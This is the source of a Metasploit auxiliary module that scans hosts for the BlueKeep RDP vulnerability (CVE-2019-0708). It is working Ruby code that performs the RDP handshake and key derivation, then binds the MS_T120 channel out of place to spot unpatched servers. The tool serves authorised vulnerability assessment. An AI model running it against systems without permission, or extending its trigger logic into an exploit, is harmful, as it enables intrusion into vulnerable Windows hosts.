##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'digest'
require 'rc4'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'CVE-2019-0708 BlueKeep Microsoft Remote Desktop RCE Check',
      'Description'    => %q{
        This module checks a range of hosts for the CVE-2019-0708 vulnerability
        by binding the MS_T120 channel outside of its normal slot and sending
        non-DoS packets which respond differently on patched and vulnerable hosts.
      },
      'References'     =>
        [
          [ 'CVE', '2019-0708' ],
          [ 'URL', 'https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708' ]
        ],
      'Author'         =>
        [
          'JaGoTu',
          'zerosum0x0'
        ],
      'License'        => MSF_LICENSE,
      'Notes'          =>
        {
            'Stability'   => [ CRASH_SAFE ],
            'AKA'         => ['BlueKeep']
        }
    ))

    register_options(
      [
        OptPort.new('RPORT', [ true, 'Remote port running RDP', 3389 ])
      ])
  end

  def report_goods
    report_vuln(
      :host         => rhost,
      :port         => rport,
      :proto        => 'tcp',
      :name         => self.name,
      :info         => 'Behavior indicates a missing Microsoft Windows RDP patch for CVE-2019-0708',
      :refs         => self.references
    )
  end

  def check_rdp
    # code to check if RDP is open or not
    vprint_status("Verifying RDP protocol...")

    # send connection
    #sock.put(connection_request)
    pkt = "\x03\x00\x00\x2b"
    pkt << "\x26\xe0\x00\x00\x00\x00\x00\x43\x6f\x6f\x6b\x69\x65\x3a\x20\x6d\x73\x74\x73\x68\x61\x73\x68\x3d"
    pkt << Rex::Text.rand_text_alpha(5) # "username"
    pkt << "\x0d\x0a\x01\x00\x08\x00\x00\x00\x00\x00"
    sock.put(pkt)

    # read packet to see if its rdp
    res = sock.get_once(-1, 5)

    # return true if this matches our vulnerable response
    #( res and res.match("\x03\x00\x00\x0b\x06\xd0\x00\x00\x12\x34\x00") )
    return true
  end

  def connection_request
    "\x03\x00" +    # TPKT Header version 03, reserved 0
    "\x00\x0b" +    # Length
    "\x06" +        # X.224 Data TPDU length
    "\xe0" +        # X.224 Type (Connection request)
    "\x00\x00" +    # dst reference
    "\x00\x00" +    # src reference
    "\x00"          # class and options
  end

  # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/db6713ee-1c0e-4064-a3b3-0fac30b4037b
  def pdu_connect_initial
    pkt = "030001ca02f0807f658201be0401010401010101ff30200202002202020002020200000202000102020000020200010202ffff020200023020020200010202000102020001020200010202000002020001020204200202000230200202ffff0202fc170202ffff0202000102020000020200010202ffff020200020482014b000500147c00018142000800100001c00044756361813401c0d800040008002003580201ca03aa09040000280a0000780031003800310030000000000000000000000000000000000000000000000004000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001ca0100000000001800070001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004c00c00090000000000000002c00c00030000000000000003c0440005000000636c697072647200c0a000004d535f543132300080800000726470736e640000c0000000736e646462670000c0000000726470647200000080800000"
    return [pkt].pack("H*")
  end

  # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/04c60697-0d9a-4afd-a0cd-2cc133151a9c
  def pdu_erect_domain_request
    pkt = "0300000c02f0800400010001"
    return [pkt].pack("H*")
  end

  # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/f5d6a541-9b36-4100-b78f-18710f39f247
  def pdu_attach_user_request
    "\x03\x00" +         # header
    "\x00\x08" +         # length
    "\x02\xf0\x80" +     # X.224 Data TPDU (2 bytes: 0xf0 = Data TPDU, 0x80 = EOT, end of transmission)
    "\x28"               # PER encoded PDU contents
  end

  # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/64564639-3b2d-4d2c-ae77-1105b4cc011b
  def pdu_channel_request(user1, channel_id)
    pkt = "\x03\x00"          # header
    pkt << "\x00\x0c"          # length
    pkt << "\x02\xf0\x80"       # X.224
    pkt << "\x38"              # ChannelJoin request
    pkt << [user1, channel_id].pack("nn")
    return pkt
  end

  # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/9cde84cd-5055-475a-ac8b-704db419b66f
  def pdu_security_exchange(rcran, rsexp, rsmod, bitlen)
    encrypted_rcran_bignum = rsa_encrypt(rcran, rsexp, rsmod)
    encrypted_rcran = int_to_bytestring(encrypted_rcran_bignum)

    bitlen += 8
    bitlen_hex = [bitlen].pack("L<")

    vprint_status("Encrypted client random: #{bin_to_hex(encrypted_rcran)}")

    userdata_length = 8 + bitlen
    userdata_length_low = userdata_length & 0xFF
    userdata_length_high = userdata_length / 256
    flags = 0x80 | userdata_length_high

    pkt = "\x03\x00"
    pkt << [userdata_length+15].pack("S>") # TPKT
    pkt << "\x02\xf0\x80" # X.224
    pkt << "\x64" # sendDataRequest
    pkt << "\x00\x08" # intiator userId
    pkt << "\x03\xeb" # channelId = 1003
    pkt << "\x70" # dataPriority
    pkt << [flags].pack("C") #
    pkt << [userdata_length_low].pack("C") # UserData length
    pkt << "\x01\x00" # securityHeader flags
    pkt << "\x00\x00" # securityHeader flagsHi
    pkt << bitlen_hex # securityPkt length
    pkt << encrypted_rcran # 64 bytes encrypted client random
    pkt << "\x00\x00\x00\x00\x00\x00\x00\x00" # 8 bytes rear padding (always present)
    pkt
  end

  # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/772d618e-b7d6-4cd0-b735-fa08af558f9d
  def pdu_client_info()
    data = "000000003301000000000a00000000000000000075007300650072003000000000000000000002001c003100390032002e003100360038002e0031002e0032003000380000003c0043003a005c00570049004e004e0054005c00530079007300740065006d00330032005c006d007300740073006300610078002e0064006c006c000000a40100004700540042002c0020006e006f0072006d0061006c0074006900640000000000000000000000000000000000000000000000000000000000000000000000000000000a00000005000300000000000000000000004700540042002c00200073006f006d006d006100720074006900640000000000000000000000000000000000000000000000000000000000000000000000000000000300000005000200000000000000c4ffffff00000000270000000000"
    return [data].pack("H*")
  end

  # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/4c3c2710-0bf0-4c54-8e69-aff40ffcde66
  def pdu_client_confirm_active()
    data = "a4011300f103ea030100ea0306008e014d53545343000e00000001001800010003000002000000000d04000000000000000002001c00100001000100010020035802000001000100000001000000030058000000000000000000000000000000000000000000010014000000010047012a000101010100000000010101010001010000000000010101000001010100000000a1060000000000000084030000000000e40400001300280000000003780000007800000050010000000000000000000000000000000000000000000008000a000100140014000a0008000600000007000c00000000000000000005000c00000000000200020009000800000000000f000800010000000d005800010000000904000004000000000000000c000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c000800010000000e0008000100000010003400fe000400fe000400fe000800fe000800fe001000fe002000fe004000fe008000fe000001400000080001000102000000"
    return [data].pack("H*")
  end

  # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/2d122191-af10-4e36-a781-381e91c182b7
  def pdu_client_persistent_key_list()
    data = "49031700f103ea03010000013b031c00000001000000000000000000000000000000aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    return [data].pack("H*")
  end

  # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/927de44c-7fe8-4206-a14f-e5517dc24b1c
  def rdp_parse_serverdata(pkt)
    ptr = 0
    rdp_pkt = pkt[0x49..pkt.length]

    while ptr < rdp_pkt.length
      header_type = rdp_pkt[ptr..ptr+1]
      header_length = rdp_pkt[ptr+2..ptr+3].unpack("S<")[0]

      vprint_status("header: #{bin_to_hex(header_type)} len #{header_length}")

      if header_type == "\x02\x0c"
        vprint_status("security header")

        server_random = rdp_pkt[ptr+20..ptr+51]
        public_exponent = rdp_pkt[ptr+84..ptr+87]

        modulus = rdp_pkt[ptr+88..ptr+151]
        vprint_status("modulus_old #{bin_to_hex(modulus)}")
        rsa_magic = rdp_pkt[ptr+68..ptr+71]
        if rsa_magic != "RSA1"
          print_error("Server cert isn't RSA, this scenario isn't supported (yet).")
          raise RdpCommunicationError
        end
        vprint_status("RSA magic: #{rsa_magic}")
        bitlen = rdp_pkt[ptr+72..ptr+75].unpack("L<")[0] - 8
        vprint_status("RSA bitlen: #{bitlen}")
        modulus = rdp_pkt[ptr+88..ptr+87+bitlen]
        vprint_status("modulus_new #{bin_to_hex(modulus)}")


      end


      ptr += header_length
    end

    vprint_status("SERVER_MODULUS: #{bin_to_hex(modulus)}")
    vprint_status("SERVER_EXPONENT: #{bin_to_hex(public_exponent)}")
    vprint_status("SERVER_RANDOM: #{bin_to_hex(server_random)}")

    rsmod = bytes_to_bignum(modulus)
    rsexp = bytes_to_bignum(public_exponent)
    rsran = bytes_to_bignum(server_random)

    #vprint_status("MODULUS  = #{bin_to_hex(modulus)} - #{rsmod.to_s}")
    #vprint_status("EXPONENT = #{bin_to_hex(public_exponent)} - #{rsexp.to_s}")
    #vprint_status("SVRANDOM = #{bin_to_hex(server_random)} - #{rsran.to_s}")

    return rsmod, rsexp, rsran, server_random, bitlen
  end

# used to abruptly abort scanner for a given host
  class RdpCommunicationError < StandardError
  end

  def rdp_send(data)
    sock.put(data)
    #sock.flush
    #sleep(0.1)
    #sleep(0.5)
  end

  def rdp_recv()
    res1 = sock.get_once(4, 5)
    raise RdpCommunicationError unless res1 # nil due to a timeout
    res2 = sock.get_once(res1[2..4].unpack("S>")[0], 5)
    raise RdpCommunicationError unless res2 # nil due to a timeout
    res1 + res2
  end

  def rdp_send_recv(data)
    rdp_send(data)
    return rdp_recv()
  end


  def rdp_encrypted_pkt(data, rc4enckey, hmackey, flags = "\x08\x00", flagsHi = "\x00\x00", channelId="\x03\xeb")
    userData_len = data.length + 12
    udl_with_flag = 0x8000 | userData_len

    pkt = "\x02\xf0\x80" # X.224
    pkt << "\x64" # sendDataRequest
    pkt << "\x00\x08" # intiator userId .. TODO: for a functional client this isn't static
    pkt << channelId # channelId = 1003
    pkt << "\x70" # dataPriority
    #pkt << "\x80" # TODO: half of this is length field ......
    pkt << [udl_with_flag].pack("S>")
    pkt << flags #{}"\x48\x00" # flags  SEC_INFO_PKT | SEC_ENCRYPT
    pkt << flagsHi # flagsHi
    pkt << rdp_hmac(hmackey, data)[0..7]
    pkt << rdp_rc4_crypt(rc4enckey, data)

    tpkt = "\x03\x00"
    tpkt << [pkt.length + 4].pack("S>")
    tpkt << pkt

    tpkt
  end

  def try_check(rc4enckey, hmackey)
    begin
      for i in 0..5
        res = rdp_recv()
      end
    rescue RdpCommunicationError
      #we don't care
    end

    for j in 0..5
      #x86
      pkt = rdp_encrypted_pkt(["100000000300000000000000020000000000000000000000"].pack("H*"), rc4enckey, hmackey, "\x08\x00", "\x00\x00", "\x03\xed")
      rdp_send(pkt)
      #x64
      pkt = rdp_encrypted_pkt(["20000000030000000000000000000000020000000000000000000000000000000000000000000000"].pack("H*"), rc4enckey, hmackey, "\x08\x00", "\x00\x00", "\x03\xed")
      rdp_send(pkt)

      begin
        for i in 0..3
          res = rdp_recv()
          if res.include?(["0300000902f0802180"].pack("H*"))
            return Exploit::CheckCode::Vulnerable
          end
          vprint_good("#{bin_to_hex(res)}")
        end
      rescue RdpCommunicationError
        #we don't care
      end
    end

    return Exploit::CheckCode::Safe
  end

  def check_rdp_vuln
    # check if rdp is open
    unless check_rdp
      vprint_status "Could not connect to RDP."
      return Exploit::CheckCode::Unknown
    end

    # send initial client data
    res = rdp_send_recv(pdu_connect_initial)
    rsmod, rsexp, rsran, server_rand, bitlen = rdp_parse_serverdata(res)

    # erect domain and attach user
    rdp_send(pdu_erect_domain_request )
    res = rdp_send_recv(pdu_attach_user_request)

    user1 = res[9,2].unpack("n").first

    # send channel requests
    rdp_send_recv(pdu_channel_request(user1, 1009))
    rdp_send_recv(pdu_channel_request(user1, 1003))
    rdp_send_recv(pdu_channel_request(user1, 1004))
    rdp_send_recv(pdu_channel_request(user1, 1005))
    rdp_send_recv(pdu_channel_request(user1, 1006))
    rdp_send_recv(pdu_channel_request(user1, 1007))
    rdp_send_recv(pdu_channel_request(user1, 1008))


    #client_rand = "\xff\xee\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff"
    client_rand = "\x41" * 32
    rcran = bytes_to_bignum(client_rand)

    vprint_status("Sending security exchange PDU")
    rdp_send(pdu_security_exchange(rcran, rsexp, rsmod, bitlen))

    rc4encstart, rc4decstart, hmackey, sessblob = rdp_calculate_rc4_keys(client_rand, server_rand)

    vprint_status("RC4_ENC_KEY: #{bin_to_hex(rc4encstart)}")
    vprint_status("RC4_DEC_KEY: #{bin_to_hex(rc4decstart)}")
    vprint_status("HMAC_KEY: #{bin_to_hex(hmackey)}")
    vprint_status("SESS_BLOB: #{bin_to_hex(sessblob)}")

    rc4enckey = RC4.new(rc4encstart)

    vprint_status("Sending encrypted client info PDU")
    res = rdp_send_recv(rdp_encrypted_pkt(pdu_client_info(), rc4enckey, hmackey, "\x48\x00"))

    vprint_status("Received License packet: #{bin_to_hex(res)}")

    res = rdp_recv()
    vprint_status("Received Server Demand packet: #{bin_to_hex(res)}")

    vprint_status("Sending client confirm active PDU")
    rdp_send(rdp_encrypted_pkt(pdu_client_confirm_active(), rc4enckey, hmackey, "\x38\x00"))

    vprint_status("Sending client synchronize PDU")
    vprint_status("Sending client control cooperate PDU")
    synch = rdp_encrypted_pkt(["16001700f103ea030100000108001f0000000100ea03"].pack("H*"), rc4enckey, hmackey)
    coop = rdp_encrypted_pkt(["1a001700f103ea03010000010c00140000000400000000000000"].pack("H*"), rc4enckey, hmackey)
    vprint_status("Grea2t!")
    rdp_send(synch + coop)

    vprint_status("Sending client control request control PDU")
    rdp_send(rdp_encrypted_pkt(["1a001700f103ea03010000010c00140000000100000000000000"].pack("H*"), rc4enckey, hmackey))

    vprint_status("Sending client persistent key list PDU")
    rdp_send(rdp_encrypted_pkt(pdu_client_persistent_key_list(), rc4enckey, hmackey))

    vprint_status("Sending client font list PDU")
    rdp_send(rdp_encrypted_pkt(["1a001700f103ea03010000010c00270000000000000003003200"].pack("H*"), rc4enckey, hmackey))

    #vprint_status("Sending base PDU")
    #rdp_send(rdp_encrypted_pkt(["030000001d0002000308002004051001400a000c840000000000000000590d381001cc"].pack("H*"), rc4enckey, hmackey))



    #res = rdp_recv()
    #vprint_good("#{bin_to_hex(res)}")

    result = try_check(rc4enckey, hmackey)



    if result == Exploit::CheckCode::Vulnerable
      report_goods
    end


    # Can't determine, but at least I know the service is running
    return result
  end

  def check_host(ip)
    # The check command will call this method instead of run_host

    status = Exploit::CheckCode::Unknown

    begin
      begin
        connect
      rescue ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
        return Exploit::CheckCode::Unsupported	 # used to display custom msg error
      end

      status = Exploit::CheckCode::Detected

      sock.setsockopt(::Socket::IPPROTO_TCP, ::Socket::TCP_NODELAY, 1)
      status = check_rdp_vuln
    rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError, ::TypeError => e
      bt = e.backtrace.join("\n")
      vprint_error("Unexpected error: #{e.message}")
      vprint_line(bt)
      elog("#{e.message}\n#{bt}")
    rescue RdpCommunicationError => e
      vprint_error("Error communicating RDP protocol.")
      status = Exploit::CheckCode::Unknown
    rescue Errno::ECONNRESET => e # NLA?
      vprint_error("Connection reset, possible NLA is enabled.")
    rescue => e
      bt = e.backtrace.join("\n")
      vprint_error("Unexpected error: #{e.message}")
      vprint_line(bt)
      elog("#{e.message}\n#{bt}")
    ensure
      disconnect
    end

    status
  end

  def run_host(ip)
    # Allow the run command to call the check command

    status = check_host(ip)
    if status == Exploit::CheckCode::Vulnerable
      print_good("#{status[1]}")
    elsif status == Exploit::CheckCode::Unsupported	 # used to display custom msg error
      status = Exploit::CheckCode::Safe
      print_status("The target service is not running, or refused our connection.")
    else
      print_status("#{status[1]}")
    end

    status
  end

  # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/7c61b54e-f6cd-4819-a59a-daf200f6bf94
  # mac_salt_key = "W\x13\xc58\x7f\xeb\xa9\x10*\x1e\xddV\x96\x8b[d"
  # data_content = "\x12\x00\x17\x00\xef\x03\xea\x03\x02\x00\x00\x01\x04\x00$\x00\x00\x00"
  # hmac = rdp_hmac(mac_salt_key, data_content) # == hexlified: "22d5aeb486994a0c785dc929a2855923"
  def rdp_hmac(mac_salt_key, data_content)
    sha1 = Digest::SHA1.new
    md5 = Digest::MD5.new

    pad1 = "\x36" * 40
    pad2 = "\x5c" * 48

    sha1 << mac_salt_key
    sha1 << pad1
    sha1 << [data_content.length].pack('<L')
    sha1 << data_content

    md5 << mac_salt_key
    md5 << pad2
    md5 << [sha1.hexdigest()].pack("H*")

    return [md5.hexdigest()].pack("H*")
  end

  # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/705f9542-b0e3-48be-b9a5-cf2ee582607f
  #  SaltedHash(S, I) = MD5(S + SHA(I + S + ClientRandom + ServerRandom))
  def rdp_salted_hash(s_bytes, i_bytes, clientRandom_bytes, serverRandom_bytes)
    sha1 = Digest::SHA1.new
    md5 = Digest::MD5.new

    sha1 << i_bytes
    sha1 << s_bytes
    sha1 << clientRandom_bytes
    sha1 << serverRandom_bytes

    md5 << s_bytes
    md5 << [sha1.hexdigest()].pack("H*")
    return [md5.hexdigest()].pack("H*")
  end

  #  FinalHash(K) = MD5(K + ClientRandom + ServerRandom)
  def rdp_final_hash(k, clientRandom_bytes, serverRandom_bytes)
    md5 = Digest::MD5.new

    md5 << k
    md5 << clientRandom_bytes
    md5 << serverRandom_bytes
    return [md5.hexdigest()].pack("H*")
  end

  def rdp_calculate_rc4_keys(client_random, server_random)
    # preMasterSecret = First192Bits(ClientRandom) + First192Bits(ServerRandom)
    preMasterSecret = client_random[0..23] + server_random[0..23]

    #  PreMasterHash(I) = SaltedHash(preMasterSecret, I)
    #  MasterSecret = PreMasterHash(0x41) + PreMasterHash(0x4242) + PreMasterHash(0x434343)
    masterSecret = rdp_salted_hash(preMasterSecret,"A",client_random,server_random) +  rdp_salted_hash(preMasterSecret,"BB",client_random,server_random) + rdp_salted_hash(preMasterSecret,"CCC",client_random,server_random)

    # MasterHash(I) = SaltedHash(MasterSecret, I)
    # SessionKeyBlob = MasterHash(0x58) + MasterHash(0x5959) + MasterHash(0x5A5A5A)
    sessionKeyBlob = rdp_salted_hash(masterSecret,"X",client_random,server_random) +  rdp_salted_hash(masterSecret,"YY",client_random,server_random) + rdp_salted_hash(masterSecret,"ZZZ",client_random,server_random)

    # InitialClientDecryptKey128 = FinalHash(Second128Bits(SessionKeyBlob))
    initialClientDecryptKey128 = rdp_final_hash(sessionKeyBlob[16..31], client_random, server_random)

    # InitialClientEncryptKey128 = FinalHash(Third128Bits(SessionKeyBlob))
    initialClientEncryptKey128 = rdp_final_hash(sessionKeyBlob[32..47], client_random, server_random)

    macKey = sessionKeyBlob[0..15]

    vprint_status("PreMasterSecret = #{bin_to_hex(preMasterSecret)}")
    vprint_status("MasterSecret = #{bin_to_hex(masterSecret)}")
    vprint_status("sessionKeyBlob = #{bin_to_hex(sessionKeyBlob)}")
    vprint_status("macKey = #{bin_to_hex(macKey)}")
    vprint_status("initialClientDecryptKey128 = #{bin_to_hex(initialClientDecryptKey128)}")
    vprint_status("initialClientEncryptKey128 = #{bin_to_hex(initialClientEncryptKey128)}")

    return initialClientEncryptKey128, initialClientDecryptKey128, macKey, sessionKeyBlob
  end

  def rsa_encrypt(bignum, rsexp, rsmod)
    (bignum ** rsexp) % rsmod
  end

  def rdp_rc4_crypt(rc4obj, data)
    return rc4obj.encrypt(data)
  end

  def bytes_to_bignum(bytesIn, order = "little")
    bytes = bin_to_hex(bytesIn)
    if order == "little"
      bytes = bytes.scan(/../).reverse.join('')
    end
    s = "0x"+bytes
    s.to_i(16)
  end

  def bignum_to_bytes(bigNum, order = "little")
    int_to_bytestring(bigNum)
    if order == "little"
      bytes = bytes.scan(/../).reverse.join('')
    end
  end

  # https://www.ruby-forum.com/t/integer-to-byte-string-speed-improvements/67110
  def int_to_bytestring( daInt, num_chars=nil )
    unless num_chars
      bits_needed = Math.log( daInt ) / Math.log( 2 )
      num_chars = ( bits_needed / 8.0 ).ceil
    end
    if pack_code = { 1=>'C', 2=>'S', 4=>'L' }[ num_chars ]
      [ daInt ].pack( pack_code )
    else
      a = (0..(num_chars)).map{ |i|
        (( daInt >> i*8 ) & 0xFF ).chr
      }.join
      a[0..-2] # seems legit lol
    end
  end

  def bin_to_hex(s)
    s.each_byte.map { |b| b.to_s(16).rjust(2,'0') }.join
  end

end
